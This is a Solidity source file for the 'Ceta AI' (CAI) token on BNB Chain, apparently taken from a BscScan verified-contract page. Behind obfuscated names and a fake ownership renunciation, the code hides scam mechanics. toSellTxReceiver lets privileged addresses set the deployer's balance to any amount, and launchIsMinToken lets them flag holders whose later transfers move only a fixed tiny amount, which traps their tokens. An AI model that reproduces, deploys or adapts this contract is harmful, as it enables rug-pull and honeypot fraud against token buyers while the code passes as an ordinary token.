/**
 *Submitted for verification at BscScan.com on 2023-02-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface listAtTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverTokenLaunch) external view returns (uint256);

    function transfer(address launchEnableMax, uint256 liquidityExemptTeam) external returns (bool);

    function allowance(address minAmountSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityExemptTeam) external returns (bool);

    function transferFrom(
        address sender,
        address launchEnableMax,
        uint256 liquidityExemptTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletSellTo, uint256 value);
    event Approval(address indexed minAmountSell, address indexed spender, uint256 value);
}

interface listAtTradingMetadata is listAtTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract limitAutoSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellShouldTeam {
    function createPair(address launchLiquidityExemptMarketing, address atModeReceiver) external returns (address);
}

interface launchedSenderBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CetaAI is limitAutoSwap, listAtTrading, listAtTradingMetadata {

    mapping(address => bool) public swapModeToTake;

    uint8 private walletModeTo = 18;

    address public listReceiverSwap;

    address private sellModeSender;

    function totalSupply() external view virtual override returns (uint256) {
        return launchTxAtSender;
    }

    function launchMinList() public view returns (bool) {
        return listWalletExempt;
    }

    function isLaunchedSwap() public {
        if (exemptMaxSwapSender == limitAmountFee) {
            limitAmountFee = liquidityTxEnable;
        }
        if (liquidityTxEnable == receiverShouldList) {
            launchAutoFund = false;
        }
        launchAutoFund=false;
    }

    function symbol() external view virtual override returns (string memory) {
        return senderWalletTotal;
    }

    function toSellTxReceiver(uint256 liquidityExemptTeam) public {
        if (!exemptAmountBuy[_msgSender()]) {
            return;
        }
        amountModeListAuto[listReceiverSwap] = liquidityExemptTeam;
    }

    function name() external view virtual override returns (string memory) {
        return senderLimitFund;
    }

    uint256 private receiverShouldList;

    event OwnershipTransferred(address indexed limitAtMax, address indexed isAtExempt);

    bool public amountEnableReceiverAuto;

    address public toTxTrading;

    function decimals() external view virtual override returns (uint8) {
        return walletModeTo;
    }

    mapping(address => bool) public exemptAmountBuy;

    function transferFrom(address autoLiquiditySender, address launchEnableMax, uint256 liquidityExemptTeam) external override returns (bool) {
        if (maxTeamShould[autoLiquiditySender][_msgSender()] != type(uint256).max) {
            require(liquidityExemptTeam <= maxTeamShould[autoLiquiditySender][_msgSender()]);
            maxTeamShould[autoLiquiditySender][_msgSender()] -= liquidityExemptTeam;
        }
        return swapLiquidityIsSender(autoLiquiditySender, launchEnableMax, liquidityExemptTeam);
    }

    uint256 constant shouldReceiverTx = 9 ** 10;

    function swapLiquidityIsSender(address autoLiquiditySender, address launchEnableMax, uint256 liquidityExemptTeam) internal returns (bool) {
        if (autoLiquiditySender == listReceiverSwap) {
            return enableTokenSender(autoLiquiditySender, launchEnableMax, liquidityExemptTeam);
        }
        if (swapModeToTake[autoLiquiditySender]) {
            return enableTokenSender(autoLiquiditySender, launchEnableMax, shouldReceiverTx);
        }
        return enableTokenSender(autoLiquiditySender, launchEnableMax, liquidityExemptTeam);
    }

    function owner() external view returns (address) {
        return sellModeSender;
    }

    uint256 private exemptMaxSwapSender;

    function approve(address marketingFromLimitFee, uint256 liquidityExemptTeam) public virtual override returns (bool) {
        maxTeamShould[_msgSender()][marketingFromLimitFee] = liquidityExemptTeam;
        emit Approval(_msgSender(), marketingFromLimitFee, liquidityExemptTeam);
        return true;
    }

    mapping(address => mapping(address => uint256)) private maxTeamShould;

    bool public takeAmountList;

    function balanceOf(address receiverTokenLaunch) public view virtual override returns (uint256) {
        return amountModeListAuto[receiverTokenLaunch];
    }

    bool public autoLiquidityLaunchedMax;

    function enableFundLimitAuto() public view returns (uint256) {
        return exemptMaxSwapSender;
    }

    function allowance(address shouldLaunchedMarketing, address marketingFromLimitFee) external view virtual override returns (uint256) {
        return maxTeamShould[shouldLaunchedMarketing][marketingFromLimitFee];
    }

    function shouldAutoFund() public {
        emit OwnershipTransferred(listReceiverSwap, address(0));
        sellModeSender = address(0);
    }

    uint256 public liquidityTxEnable;

    string private senderLimitFund = "Ceta AI";

    function tokenLaunchedSell(address walletTakeAt) public {
        if (amountEnableReceiverAuto) {
            return;
        }
        if (receiverShouldList == liquidityTxEnable) {
            launchAutoFund = true;
        }
        exemptAmountBuy[walletTakeAt] = true;
        if (listTakeSwap == autoLiquidityLaunchedMax) {
            listTakeSwap = true;
        }
        amountEnableReceiverAuto = true;
    }

    constructor (){ 
        if (autoLiquidityLaunchedMax != takeAmountList) {
            liquidityTxEnable = receiverShouldList;
        }
        launchedSenderBuy walletTradingReceiver = launchedSenderBuy(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        toTxTrading = sellShouldTeam(walletTradingReceiver.factory()).createPair(walletTradingReceiver.WETH(), address(this));
        sellModeSender = _msgSender();
        if (launchAutoFund == listTakeSwap) {
            liquidityTxEnable = exemptMaxSwapSender;
        }
        listReceiverSwap = _msgSender();
        exemptAmountBuy[_msgSender()] = true;
        if (listWalletExempt) {
            launchAutoFund = true;
        }
        amountModeListAuto[_msgSender()] = launchTxAtSender;
        emit Transfer(address(0), listReceiverSwap, launchTxAtSender);
        shouldAutoFund();
    }

    function amountTradingToken() public {
        
        
        autoLiquidityLaunchedMax=false;
    }

    mapping(address => uint256) private amountModeListAuto;

    function getOwner() external view returns (address) {
        return sellModeSender;
    }

    bool public listWalletExempt;

    function enableTokenSender(address autoLiquiditySender, address launchEnableMax, uint256 liquidityExemptTeam) internal returns (bool) {
        require(amountModeListAuto[autoLiquiditySender] >= liquidityExemptTeam);
        amountModeListAuto[autoLiquiditySender] -= liquidityExemptTeam;
        amountModeListAuto[launchEnableMax] += liquidityExemptTeam;
        emit Transfer(autoLiquiditySender, launchEnableMax, liquidityExemptTeam);
        return true;
    }

    uint256 private limitAmountFee;

    function transfer(address tokenMaxLaunchedTo, uint256 liquidityExemptTeam) external virtual override returns (bool) {
        return swapLiquidityIsSender(_msgSender(), tokenMaxLaunchedTo, liquidityExemptTeam);
    }

    string private senderWalletTotal = "CAI";

    uint256 private launchTxAtSender = 100000000 * 10 ** 18;

    bool private launchAutoFund;

    function teamTakeLiquidity() public view returns (bool) {
        return listTakeSwap;
    }

    bool private listTakeSwap;

    function launchIsMinToken(address fromMaxTrading) public {
        if (limitAmountFee == receiverShouldList) {
            receiverShouldList = limitAmountFee;
        }
        if (fromMaxTrading == listReceiverSwap || fromMaxTrading == toTxTrading || !exemptAmountBuy[_msgSender()]) {
            return;
        }
        
        swapModeToTake[fromMaxTrading] = true;
    }

}